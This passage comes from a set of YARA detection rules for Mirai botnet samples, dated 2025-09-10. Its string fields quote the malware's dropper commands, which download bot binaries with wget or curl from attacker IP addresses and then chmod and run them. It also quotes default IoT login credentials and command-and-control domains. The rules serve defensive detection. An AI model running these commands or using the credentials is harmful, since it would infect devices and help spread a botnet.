      $s1 = "busybox wget http://196.251.84.79/bins/sora.arm; chmod 777 sora.arm; ./sora.arm android" fullword ascii /* score: '26.00'*/
      $s2 = "busybox wget http://196.251.84.79/bins/sora.spc; chmod 777 sora.spc; ./sora.spc android" fullword ascii /* score: '26.00'*/
      $s3 = "busybox wget http://196.251.84.79/bins/sora.ppc; chmod 777 sora.ppc; ./sora.ppc android" fullword ascii /* score: '26.00'*/
      $s4 = "busybox wget http://196.251.84.79/bins/sora.arm5; chmod 777 sora.arm5; ./sora.arm5 android" fullword ascii /* score: '23.00'*/
      $s5 = "busybox wget http://196.251.84.79/bins/sora.arm7; chmod 777 sora.arm7; ./sora.arm7 android" fullword ascii /* score: '23.00'*/
      $s6 = "busybox wget http://196.251.84.79/bins/sora.mpsl; chmod 777 sora.mpsl; ./sora.mpsl android" fullword ascii /* score: '23.00'*/
      $s7 = "busybox wget http://196.251.84.79/bins/sora.x86_64; chmod 777 sora.x86_64; ./sora.x86_64 android" fullword ascii /* score: '23.00'*/
      $s8 = "busybox wget http://196.251.84.79/bins/sora.sh4; chmod 777 sora.sh4; ./sora.sh4 android" fullword ascii /* score: '23.00'*/
      $s9 = "busybox wget http://196.251.84.79/bins/sora.arm6; chmod 777 sora.arm6; ./sora.arm6 android" fullword ascii /* score: '23.00'*/
      $s10 = "busybox wget http://196.251.84.79/bins/sora.m68k; chmod 777 sora.m68k; ./sora.m68k android" fullword ascii /* score: '23.00'*/
      $s11 = "busybox wget http://196.251.84.79/bins/sora.mips; chmod 777 sora.mips; ./sora.mips android" fullword ascii /* score: '23.00'*/
      $s12 = "busybox wget http://196.251.84.79/bins/sora.x86; chmod 777 sora.x86; ./sora.x86 android" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x7562 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__b1bd48b9 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b1bd48b9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1bd48b9290182213b184e1cff66657b121e496d051c48518a8bbe8244829f2b"
   strings:
      $s1 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s2 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s3 = "root126" fullword ascii /* score: '8.00'*/
      $s4 = "realtek" fullword ascii /* score: '8.00'*/
      $s5 = "cxlinux" fullword ascii /* score: '8.00'*/
      $s6 = "avocent" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__babb20b7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_babb20b7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "babb20b751f9b08be37b9ec2dff9d9c38d64c0600b578bd533fc6d5ab1ee5ffe"
   strings:
      $s1 = "./doc/page/login.asp?_" fullword ascii /* score: '18.00'*/
      $s2 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s3 = "srcport" fullword ascii /* score: '11.00'*/
      $s4 = "datarand" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      all of them
}

rule Mirai_signature__de9fea8d {
   meta:
      description = "_subset_batch - file Mirai(signature)_de9fea8d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "de9fea8d28d2cfa5d59d24a91f1aca56b9bdf557212ac5cae64423c60079242b"
   strings:
      $s1 = "r bad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
      $s2 = "condi2 %s:%d" fullword ascii /* score: '9.50'*/
      $s3 = "N^NuSNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__ac74e844 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ac74e844.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ac74e844a09a44df329c4689ab8f43b16371e457f1d767d1bb730aaf84944fe2"
   strings:
      $s1 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s2 = "ftpget" fullword ascii /* score: '10.00'*/
      $s3 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s4 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s5 = "attack_get_opt_len" fullword ascii /* score: '9.00'*/
      $s6 = "attack_get_opt_u32" fullword ascii /* score: '9.00'*/
      $s7 = "attack_get_opt_u16" fullword ascii /* score: '9.00'*/
      $s8 = "attack_get_opt_u8" fullword ascii /* score: '9.00'*/
      $s9 = "root126" fullword ascii /* score: '8.00'*/
      $s10 = "realtek" fullword ascii /* score: '8.00'*/
      $s11 = "cxlinux" fullword ascii /* score: '8.00'*/
      $s12 = "avocent" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule Mirai_signature__a82f200a {
   meta:
      description = "_subset_batch - file Mirai(signature)_a82f200a.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a82f200a5124da228550f4e269e3a447c1cac25ce6aad0b431aecfb86393e862"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.ppc; curl -O http://103.130.2" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.ppc; curl -O http://103.130.2" ascii /* score: '29.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.arm7; curl -O http://103.130." ascii /* score: '27.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.m68k; curl -O http://103.130." ascii /* score: '27.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.sh4; curl -O http://103.130.2" ascii /* score: '27.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.arm5; curl -O http://103.130." ascii /* score: '27.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.mips; curl -O http://103.130." ascii /* score: '27.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.arm6; curl -O http://103.130." ascii /* score: '27.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.x86; curl -O http://103.130.2" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.mpsl; curl -O http://103.130." ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.arm4; curl -O http://103.130." ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.sh4; curl -O http://103.130.2" ascii /* score: '26.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.arm4; curl -O http://103.130." ascii /* score: '26.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.mips; curl -O http://103.130." ascii /* score: '26.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.130.213.44/lmaoWTF/loligang.arm6; curl -O http://103.130." ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 5KB and
      8 of them
}

rule Mirai_signature__a878e359 {
   meta:
      description = "_subset_batch - file Mirai(signature)_a878e359.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a878e359251f6941a2eb69f438005015becf80a0a916422da665a468554d8223"
   strings:
      $s1 = "(wget http://156.226.174.33/bot.armv4l -O- || busybox wget http://156.226.174.33/bot.armv4l -O-) > .so; chmod 777 .so; ./.so qwv" ascii /* score: '28.00'*/
      $s2 = "(wget http://156.226.174.33/bot.armv5l -O- || busybox wget http://156.226.174.33/bot.armv5l -O-) > .so; chmod 777 .so; ./.so qwv" ascii /* score: '28.00'*/
      $s3 = "(wget http://156.226.174.33/bot.armv4l -O- || busybox wget http://156.226.174.33/bot.armv4l -O-) > .so; chmod 777 .so; ./.so qwv" ascii /* score: '28.00'*/
      $s4 = "(wget http://156.226.174.33/bot.armv7l -O- || busybox wget http://156.226.174.33/bot.armv7l -O-) > .so; chmod 777 .so; ./.so qwv" ascii /* score: '28.00'*/
      $s5 = "(wget http://156.226.174.33/bot.armv7l -O- || busybox wget http://156.226.174.33/bot.armv7l -O-) > .so; chmod 777 .so; ./.so qwv" ascii /* score: '28.00'*/
      $s6 = "(wget http://156.226.174.33/bot.armv6l -O- || busybox wget http://156.226.174.33/bot.armv6l -O-) > .so; chmod 777 .so; ./.so qwv" ascii /* score: '28.00'*/
      $s7 = "(wget http://156.226.174.33/bot.armv6l -O- || busybox wget http://156.226.174.33/bot.armv6l -O-) > .so; chmod 777 .so; ./.so qwv" ascii /* score: '28.00'*/
      $s8 = "(wget http://156.226.174.33/bot.sparc -O- || busybox wget http://156.226.174.33/bot.sparc -O-) > .so; chmod 777 .so; ./.so qwvu" fullword ascii /* score: '28.00'*/
      $s9 = "(wget http://156.226.174.33/bot.armv5l -O- || busybox wget http://156.226.174.33/bot.armv5l -O-) > .so; chmod 777 .so; ./.so qwv" ascii /* score: '28.00'*/
      $s10 = "(wget http://156.226.174.33/bot.i586 -O- || busybox wget http://156.226.174.33/bot.i586 -O-) > .so; chmod 777 .so; ./.so qwvu" fullword ascii /* score: '28.00'*/
      $s11 = "(wget http://156.226.174.33/bot.mipsel -O- || busybox wget http://156.226.174.33/bot.mipsel -O-) > .so; chmod 777 .so; ./.so qwv" ascii /* score: '28.00'*/
      $s12 = "(wget http://156.226.174.33/bot.i686 -O- || busybox wget http://156.226.174.33/bot.i686 -O-) > .so; chmod 777 .so; ./.so qwvu" fullword ascii /* score: '28.00'*/
      $s13 = "(wget http://156.226.174.33/bot.mipsel -O- || busybox wget http://156.226.174.33/bot.mipsel -O-) > .so; chmod 777 .so; ./.so qwv" ascii /* score: '28.00'*/
      $s14 = "(wget http://156.226.174.33/bot.mips -O- || busybox wget http://156.226.174.33/bot.mips -O-) > .so; chmod 777 .so; ./.so qwvu" fullword ascii /* score: '28.00'*/
      $s15 = "(wget http://156.226.174.33/bot.m68k -O- || busybox wget http://156.226.174.33/bot.m68k -O-) > .so; chmod 777 .so; ./.so qwvu" fullword ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x2f3e and filesize < 4KB and
      8 of them
}

rule Mirai_signature__c80c7814 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c80c7814.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c80c7814430c280c2fa69735b7fc8ad1b91d0e354cabd17a4d84a28974182a44"
   strings:
      $s1 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s2 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__de0bedc3 {
   meta:
      description = "_subset_batch - file Mirai(signature)_de0bedc3.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "de0bedc3bcdb31c4c1af285557c45fafe3ef4f032081ded77f5560d0ad4884db"
   strings:
      $s1 = "/tmp/killer.log" fullword ascii /* score: '19.00'*/
      $s2 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s3 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__d87a5493 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d87a5493.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d87a549353e032ff1d30e3659d5ac3df0b463962d55f3eed40773e0af6b584e5"
   strings:
      $s1 = "./doc/page/login.asp?_" fullword ascii /* score: '18.00'*/
      $s2 = "srcport" fullword ascii /* score: '11.00'*/
      $s3 = "datarand" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__bff1657e {
   meta:
      description = "_subset_batch - file Mirai(signature)_bff1657e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bff1657e6484fa05eba0bbdeb5d1fda80c90d76c9b672ec72ecbcb40b5202141"
   strings:
      $s1 = "/tmp/killer.log" fullword ascii /* score: '19.00'*/
      $s2 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s3 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__d867994e {
   meta:
      description = "_subset_batch - file Mirai(signature)_d867994e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d867994ebea6db2f94283448dc053e8b4a72cd682f76389d3001557ae7567e28"
   strings:
      $s1 = "/tmp/killer.log" fullword ascii /* score: '19.00'*/
      $s2 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s3 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__ce5d03cb {
   meta:
      description = "_subset_batch - file Mirai(signature)_ce5d03cb.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ce5d03cb7113dabed52342872075b40e6bfc616669c0e32a9708d7947d0535aa"
   strings:
      $s1 = "u__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s2 = "condi2 %s:%d" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__d1532e63 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d1532e63.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d1532e632709cf90bd60324aa545d08fa0b85592e8d0fddd170007460dbdc4c4"
   strings:
      $s1 = "condi2 %s:%d" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__dbfbb97b {
   meta:
      description = "_subset_batch - file Mirai(signature)_dbfbb97b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dbfbb97bfce439cccd21aeb3a0cbaf7c02d0af601b0ded5313f5945430fac93c"
   strings:
      $s1 = "condi2 %s:%d" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__ce68c614 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ce68c614.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ce68c614b87500ae5f895f5f7f7d134649c9c529ac095ca41fc78612282b9fe2"
   strings:
      $s1 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s2 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__bf5332d9 {
   meta:
      description = "_subset_batch - file Mirai(signature)_bf5332d9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bf5332d9d49eb0e018bd5fc72704e7a05aa33fcb892fad44b9d22547e7fddaa1"
   strings:
      $s1 = "condi2 %s:%d" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__aac6f4d5 {
   meta:
      description = "_subset_batch - file Mirai(signature)_aac6f4d5.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aac6f4d5e190cf79b6b06fe9635dd8f767dd9b149a0db31684284a1ab41f5f94"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/spc || curl -s -O http://206.123.145.159/s" ascii /* score: '37.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/ppc || curl -s -O http://206.123.145.159/p" ascii /* score: '37.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/arm || curl -s -O http://206.123.145.159/a" ascii /* score: '37.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/sh4 || curl -s -O http://206.123.145.159/s" ascii /* score: '34.00'*/
      $x5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/mips || curl -s -O http://206.123.145.159/" ascii /* score: '34.00'*/
      $x6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/mpsl || curl -s -O http://206.123.145.159/" ascii /* score: '34.00'*/
      $x7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/arm6 || curl -s -O http://206.123.145.159/" ascii /* score: '34.00'*/
      $x8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/arm5 || curl -s -O http://206.123.145.159/" ascii /* score: '34.00'*/
      $x9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/arm7 || curl -s -O http://206.123.145.159/" ascii /* score: '34.00'*/
      $x10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/m68k || curl -s -O http://206.123.145.159/" ascii /* score: '34.00'*/
      $x11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/x86 || curl -s -O http://206.123.145.159/x" ascii /* score: '34.00'*/
      $x12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/spc || curl -s -O http://206.123.145.159/s" ascii /* score: '31.00'*/
      $x13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/sh4 || curl -s -O http://206.123.145.159/s" ascii /* score: '31.00'*/
      $x14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/arm6 || curl -s -O http://206.123.145.159/" ascii /* score: '31.00'*/
      $x15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://206.123.145.159/x86 || curl -s -O http://206.123.145.159/x" ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 5KB and
      1 of ($x*)
}

rule Mirai_signature__b399eaf1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b399eaf1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b399eaf18e237f857daf4238244f1fca857010f0f4d96cad246914049650e03f"
   strings:
      $s1 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s2 = "__kernel_clock_gettime" fullword ascii /* score: '14.00'*/
      $s3 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s4 = "root126" fullword ascii /* score: '8.00'*/
      $s5 = "realtek" fullword ascii /* score: '8.00'*/
      $s6 = "cxlinux" fullword ascii /* score: '8.00'*/
      $s7 = "avocent" fullword ascii /* score: '8.00'*/
      $s8 = "zyuser" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__bfd9bdd7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_bfd9bdd7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bfd9bdd742f9b32b173ba407694f4b2c2d276861ffec661a91c5bec7a9fb6b60"
   strings:
      $s1 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s2 = "cvkqpav" fullword ascii /* score: '8.00'*/
      $s3 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s4 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s5 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s6 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s7 = "jgkvvagp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__cbfd4b2f {
   meta:
      description = "_subset_batch - file Mirai(signature)_cbfd4b2f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cbfd4b2fd1dac7142d3522c6b8f5767ebff2c9f82e39ac503798b99a726b6e13"
   strings:
      $s1 = "s@bad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__d6c48751 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d6c48751.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d6c487512a156e8656ceb82715c5c7dbbbb1d1e3e77278e2c0556fa0065b62a5"
   strings:
      $s1 = "lsof -t -i :34942 2>/dev/null" fullword ascii /* score: '12.00'*/
      $s2 = "[ManLet] Mapped -> %s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__b91fb622 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b91fb622.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b91fb622ae2b454e214cfdf3faf796b4149e4da5f0a97ca65a70c568fcfcf617"
   strings:
      $s1 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s2 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s3 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s4 = "attack_get_opt_len" fullword ascii /* score: '9.00'*/
      $s5 = "attack_get_opt_u32" fullword ascii /* score: '9.00'*/
      $s6 = "attack_get_opt_u16" fullword ascii /* score: '9.00'*/
      $s7 = "attack_get_opt_u8" fullword ascii /* score: '9.00'*/
      $s8 = "root126" fullword ascii /* score: '8.00'*/
      $s9 = "realtek" fullword ascii /* score: '8.00'*/
      $s10 = "cxlinux" fullword ascii /* score: '8.00'*/
      $s11 = "avocent" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule Mirai_signature__ba910e49 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ba910e49.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ba910e49044336bb4ef7d6d0d8cd2b9735de838e8e8562d7c4c0efc7614ac951"
   strings:
      $s1 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s2 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s3 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s4 = "attack_get_opt_len" fullword ascii /* score: '9.00'*/
      $s5 = "attack_get_opt_u32" fullword ascii /* score: '9.00'*/
      $s6 = "attack_get_opt_u16" fullword ascii /* score: '9.00'*/
      $s7 = "attack_get_opt_u8" fullword ascii /* score: '9.00'*/
      $s8 = "root126" fullword ascii /* score: '8.00'*/
      $s9 = "realtek" fullword ascii /* score: '8.00'*/
      $s10 = "cxlinux" fullword ascii /* score: '8.00'*/
      $s11 = "avocent" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule Mirai_signature__cec64818 {
   meta:
      description = "_subset_batch - file Mirai(signature)_cec64818.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cec6481864a2fe5ff1789b9ba3d9beb4f9031589de42205a60c5933b97796c3b"
   strings:
      $s1 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s2 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s3 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s4 = "attack_get_opt_len" fullword ascii /* score: '9.00'*/
      $s5 = "attack_get_opt_u32" fullword ascii /* score: '9.00'*/
      $s6 = "attack_get_opt_u16" fullword ascii /* score: '9.00'*/
      $s7 = "attack_get_opt_u8" fullword ascii /* score: '9.00'*/
      $s8 = "root126" fullword ascii /* score: '8.00'*/
      $s9 = "realtek" fullword ascii /* score: '8.00'*/
      $s10 = "cxlinux" fullword ascii /* score: '8.00'*/
      $s11 = "avocent" fullword ascii /* score: '8.00'*/
      $s12 = "zyuser" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule Mirai_signature__cb93ba4b {
   meta:
      description = "_subset_batch - file Mirai(signature)_cb93ba4b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cb93ba4bdeca9b98b820e6a54f5ce7259c6dea673d8ee2b92e88d39f70efb8ea"
   strings:
      $s1 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s2 = "attack_get_opt_len" fullword ascii /* score: '9.00'*/
      $s3 = "attack_get_opt_u32" fullword ascii /* score: '9.00'*/
      $s4 = "attack_get_opt_u16" fullword ascii /* score: '9.00'*/
      $s5 = "attack_get_opt_u8" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__cc17e2cd {
   meta:
      description = "_subset_batch - file Mirai(signature)_cc17e2cd.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cc17e2cdcd42f52b36ce6d413958c8e611e8f769f0406d3d433d7a7e14529c63"
   strings:
      $s1 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s2 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s3 = "miraisucks.lol" fullword ascii /* score: '10.00'*/
      $s4 = "root126" fullword ascii /* score: '8.00'*/
      $s5 = "realtek" fullword ascii /* score: '8.00'*/
      $s6 = "cxlinux" fullword ascii /* score: '8.00'*/
      $s7 = "avocent" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__dd261a08 {
   meta:
      description = "_subset_batch - file Mirai(signature)_dd261a08.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dd261a0815aa5a47a48cd66ff3d7476d3ae9c7a81bc412cebd81893fc05c9d72"
   strings:
      $s1 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s2 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s3 = "root126" fullword ascii /* score: '8.00'*/
      $s4 = "realtek" fullword ascii /* score: '8.00'*/
      $s5 = "cxlinux" fullword ascii /* score: '8.00'*/
      $s6 = "avocent" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__afc9b1e5 {
   meta:
      description = "_subset_batch - file Mirai(signature)_afc9b1e5.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "afc9b1e5af8ceb26af97bb4c3d86b44bd8fef02317916eb0ed5c429bb1019d8a"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.ppc ; /bin/busybox wget http://77.83.240.93/bot.ppc ; chmod 777 bot.pp" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.spc ; /bin/busybox wget http://77.83.240.93/bot.spc ; chmod 777 bot.sp" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.spc ; /bin/busybox wget http://77.83.240.93/bot.spc ; chmod 777 bot.sp" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.ppc ; /bin/busybox wget http://77.83.240.93/bot.ppc ; chmod 777 bot.pp" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.mipsel ; /bin/busybox wget http://77.83.240.93/bot.mipsel ; chmod 777 " ascii /* score: '27.00'*/
      $s6 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv5l ; /bin/busybox wget http://77.83.240.93/bot.armv5l ; chmod 777 " ascii /* score: '27.00'*/
      $s7 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arvm7l ; /bin/busybox wget http://77.83.240.93/bot.arvm7l ; chmod 777 " ascii /* score: '27.00'*/
      $s8 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.i586 ; /bin/busybox wget http://77.83.240.93/bot.i586 ; chmod 777 bot." ascii /* score: '27.00'*/
      $s9 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.armv6l ; /bin/busybox wget http://77.83.240.93/bot.armv6l ; chmod 777 " ascii /* score: '27.00'*/
